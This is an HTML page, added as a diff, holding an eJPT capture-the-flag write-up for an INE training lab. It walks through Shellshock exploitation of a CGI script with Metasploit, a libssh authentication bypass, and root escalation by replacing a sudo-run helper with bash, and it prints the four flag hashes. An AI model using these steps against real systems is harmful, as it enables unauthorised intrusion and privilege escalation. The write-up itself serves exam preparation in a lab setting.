@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>INE eJPT — Host &amp; Network Penetration Testing: System-Host Based Attacks CTF 2</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+:root{--navy:#0E1B33;--ink:#1A2233;--muted:#4A5568;--soft:#6B7280;--line:#E3E8EF;--bg:#FFFFFF;--accent:#0B5CAD;--code-bg:#0E1B33;--code-ink:#E6EDF3;--inline:#EEF2F7;--flag-bg:#E9F8F5;--flag-line:#9FDCD3;--flag-ink:#0B3F38;--note-bg:#FFF7E6;--note-line:#E8B45A;--note-ink:#5A3E00;}
+*{box-sizing:border-box}
+body{margin:0;background:#F4F6F9;color:var(--ink);font-family:'IBM Plex Sans',system-ui,sans-serif;line-height:1.65;font-size:17px}
+.page{max-width:860px;margin:0 auto;background:var(--bg);min-height:100vh;padding:0 clamp(16px,5vw,56px) 72px}
+.mono{font-family:'IBM Plex Mono',ui-monospace,monospace}
+.banner{margin:36px 0 8px;background:linear-gradient(135deg,#0E1B33,#15294a);color:#fff;border-radius:14px;padding:26px 30px;display:flex;justify-content:space-between;align-items:center;gap:20px;overflow:hidden}
+.b-left{display:flex;flex-direction:column;gap:6px;z-index:1}
+.b-tag{font-family:'IBM Plex Mono',monospace;font-size:12px;letter-spacing:2px;color:#3DD6C3}
+.b-title{font-size:30px;font-weight:700;letter-spacing:-.5px;line-height:1.1}
+.b-sub{font-size:15px;color:#C9D3E3}
+.b-meta{display:flex;gap:16px;margin-top:6px;font-size:13px;color:#9FB0C8;flex-wrap:wrap}
+.b-art{font-family:'IBM Plex Mono',monospace;font-size:34px;font-weight:600;color:rgba(255,255,255,.14);line-height:1.05;text-align:right;white-space:nowrap}
+h1.doctitle{font-size:clamp(28px,5vw,40px);line-height:1.12;letter-spacing:-1px;margin:28px 0 6px}
+.lede{font-size:18px;color:var(--muted);margin:0 0 4px}
+.byline{font-size:14px;color:var(--soft);margin:0 0 8px}
+h2{font-size:25px;margin:40px 0 4px;padding-bottom:10px;border-bottom:1px solid var(--line);letter-spacing:-.4px}
+h3{font-size:19px;margin:26px 0 8px;color:var(--navy)}
+p{margin:12px 0}
+ul,ol{margin:12px 0;padding-left:24px}
+li{margin:5px 0}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+code:not(pre code){background:var(--inline);border-radius:5px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:14.5px;color:#0E1B33}
+pre{background:var(--code-bg);color:var(--code-ink);border-radius:10px;padding:16px 18px;overflow-x:auto;font-family:'IBM Plex Mono',monospace;font-size:14px;line-height:1.6;margin:14px 0}
+pre code{white-space:pre}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0}
+.chip{font-family:'IBM Plex Mono',monospace;font-size:13px;background:#EEF2F7;border:1px solid var(--line);border-radius:999px;padding:4px 12px;color:var(--navy)}
+figure{margin:18px 0}
+.shot{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;min-height:120px;background:#F2F5F9;border:2px dashed #C4CEDC;border-radius:12px;color:#8A97A8;text-align:center;padding:22px}
+.shot svg{opacity:.6}
+.shot .lbl{font-size:13.5px;font-family:'IBM Plex Mono',monospace}
+figure img{max-width:100%;border:1px solid var(--line);border-radius:12px;display:block}
+figcaption{font-size:13.5px;color:var(--soft);text-align:center;margin-top:8px}
+.flag{display:flex;align-items:center;gap:12px;background:var(--flag-bg);border:1px solid var(--flag-line);border-radius:12px;padding:12px 18px;margin:16px 0;color:var(--flag-ink);font-weight:600;font-size:16px}
+.flag .mono{background:#fff;border:1px solid var(--flag-line);border-radius:6px;padding:2px 10px;font-size:15px}
+.note{background:var(--note-bg);border:1px solid var(--note-line);border-radius:12px;padding:14px 18px;margin:16px 0;color:var(--note-ink);font-size:15.5px}
+table{border-collapse:collapse;width:100%;margin:16px 0;font-size:15px}
+th,td{border:1px solid var(--line);padding:9px 12px;text-align:left}
+th{background:#F2F5F9;font-weight:600}
+.footer{margin-top:50px;padding-top:18px;border-top:1px solid var(--line);font-size:13px;color:var(--soft);display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.disclaimer{font-size:13.5px;color:var(--soft);font-style:italic;margin-top:10px}
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="banner"><div class="b-left">
+    <span class="b-tag">INE · eJPT · HOST &amp; NETWORK PENTESTING</span>
+    <span class="b-title">System-Host Based Attacks CTF 2</span>
+    <span class="b-sub">Shellshock CGI · libssh auth bypass · sudo binary hijack</span>
+    <span class="b-meta"><span>🎯 4 flags</span><span>🛠️ Nmap · Burp Suite · Metasploit</span></span>
+  </div><div class="b-art">10 10<br>1110<br>0101&nbsp;01</div></div>
+  <h1 class="doctitle">System-Host Based Attacks CTF 2</h1>
+  <p class="lede">Attack <code>target1</code> and <code>target2</code>, from a Shellshock CGI foothold to a sudo binary-hijack privesc.</p>
+  <p class="byline">eJPT preparation · Write-up by Zeliha Zengin</p>
+  <h2>Lab Environment</h2>
+  <p>GUI access to a Kali machine is provided. Two targets: <code>target1.ine.local</code> and <code>target2.ine.local</code>.</p>
+  <ul><li><b>Flag 1:</b> Check the root (<code>/</code>) directory on <code>target1</code>.</li><li><b>Flag 2:</b> Explore <code>/opt/apache/htdocs/</code> on <code>target1</code> — the file's name begins with a dot.</li><li><b>Flag 3:</b> Investigate the user's home on <code>target2</code> (use the <code>libssh_auth_bypass</code> module).</li><li><b>Flag 4:</b> Look in <code>/root</code> on <code>target2</code>.</li></ul>
+  <div class="note"><b>Note:</b> Flag format is <code>FLAG#_&lt;MD5&gt;</code> — submit only the hash, without the prefix or underscore.</div>
+  <div class="chips"><span class="chip">Nmap</span><span class="chip">Burp Suite</span><span class="chip">Metasploit</span></div>
+  <p class="disclaimer">All work is performed against an authorized INE training lab for eJPT exam preparation.</p>
+  <h2>Flag 1 — Shellshock via a CGI script on target1</h2>
+  <p>Scan the target and enumerate the web root. The <code>/cgi-bin/</code> directory holds executables; <code>browser.cgi</code> is the interesting one:</p>
+  <pre><code>cat /etc/hosts
+nmap -sV -sC -p- -Pn -A target1.ine.local
+dirb http://target1.ine.local</code></pre>
+  <p>Exploit the CGI with the Shellshock module (find your <code>LHOST</code> with <code>ip a</code>):</p>
+  <pre><code>msfconsole -q
+search Shellshock
+use 1
+show options
+set RHOSTS target1.ine.local
+set TARGETURI /browser.cgi
+set LHOST &lt;your-ip&gt;
+run</code></pre>
+  <p>Once the session opens, read the flag from <code>/</code>:</p>
+  <pre><code>getuid
+sysinfo
+cd /
+ls
+cat flag.txt</code></pre>
+  <div class="note"><b>Note:</b> An Apache <code>cgi-bin</code> RCE module (<code>search Apache cgi-bin</code>) is a viable alternative to the dedicated Shellshock module.</div>
+  <div class="flag">🏁 <span>FLAG 1:</span> <span class="mono">035713a7bba1436f9ad95e2f39e2856d</span></div>
+  <h2>Flag 2 — Hidden file in the web root</h2>
+  <p>List <code>/opt/apache/htdocs/</code> including dotfiles — the flag lives in a file whose name starts with a dot:</p>
+  <pre><code>ls -la /opt/apache/htdocs/
+cat /opt/apache/htdocs/.flag.txt</code></pre>
+  <div class="flag">🏁 <span>FLAG 2:</span> <span class="mono">1358180f3b6349b49e211b87977d95a3</span></div>
+  <h2>Flag 3 — libssh authentication bypass on target2</h2>
+  <p>Nmap shows SSH running on <b>libssh</b>, which is vulnerable to an authentication bypass. Use the Metasploit module, set <code>SPAWN_PTY</code>, and interact with the session:</p>
+  <pre><code>nmap -sV -p- -Pn -A target2.ine.local
+msfconsole
+search libssh_auth_bypass
+use 0
+set RHOSTS target2.ine.local
+set SPAWN_PTY true
+run
+sessions
+sessions -i 1</code></pre>
+  <p>Read the flag from the user's home directory:</p>
+  <pre><code>cd /home/user
+ls
+cat flag.txt</code></pre>
+  <div class="flag">🏁 <span>FLAG 3:</span> <span class="mono">5b4ad5b2d81e44ceb7b32acbc149ad65</span></div>
+  <h2>Flag 4 — Privilege escalation via sudo binary hijack</h2>
+  <p><code>/root</code> contains two binaries: <code>welcome</code> and <code>greetings</code>. <code>welcome</code> runs <code>greetings</code> with elevated (sudo) privileges — a classic hijack. Trace it, then replace <code>greetings</code> with a copy of <code>bash</code>:</p>
+  <pre><code>cd /root
+ls -la
+strace ./welcome
+rm greetings
+cp /bin/bash greetings
+./welcome</code></pre>
+  <p>Running <code>welcome</code> now executes your <code>bash</code> as root. Read the flag:</p>
+  <pre><code>cd /root
+cat flag.txt</code></pre>
+  <div class="flag">🏁 <span>FLAG 4:</span> <span class="mono">fe647ae475074f94919ebe90a5183c8d</span></div>
+  <h2>Summary</h2>
+  <table><tr><th>Flag</th><th>Target</th><th>Technique</th></tr><tr><td>1</td><td>target1</td><td>Shellshock RCE on <code>browser.cgi</code> → read <code>/flag.txt</code></td></tr><tr><td>2</td><td>target1</td><td>Hidden dotfile in <code>/opt/apache/htdocs/</code></td></tr><tr><td>3</td><td>target2</td><td>libssh authentication bypass → <code>/home/user</code></td></tr><tr><td>4</td><td>target2</td><td>sudo binary hijack (replace <code>greetings</code> with <code>bash</code>)</td></tr></table>
+  <h3>Key Takeaways</h3>
+  <ul><li>A <code>.cgi</code> script under <code>/cgi-bin/</code> is a prime Shellshock candidate — test it early.</li><li>Always list with <code>-la</code>; flags are often hidden dotfiles.</li><li>An SSH service built on vulnerable libssh can be bypassed outright — fingerprint the SSH stack, not just the port.</li><li>A privileged program that calls a relative/overwritable helper (<code>strace</code> reveals it) is a reliable privesc.</li></ul>
+  <div class="footer"><span>Write-up by Zeliha Zengin · eJPT preparation</span><span class="mono">CYBER COMBAT COURSE · C3</span></div>
+</div>
+<script>
+document.querySelectorAll('.shot[data-img]').forEach(ph=>{
+  const src=ph.getAttribute('data-img');const img=new Image();
+  img.onload=()=>{const cap=ph.querySelector('.lbl')?.textContent||'';
+    ph.parentElement.innerHTML='<img src="'+src+'" alt="'+cap+'"><figcaption>'+cap.replace(/^Screenshot:\s*/,'')+'</figcaption>';};
+  img.src=src;});
+</script>
+</body>
+</html>
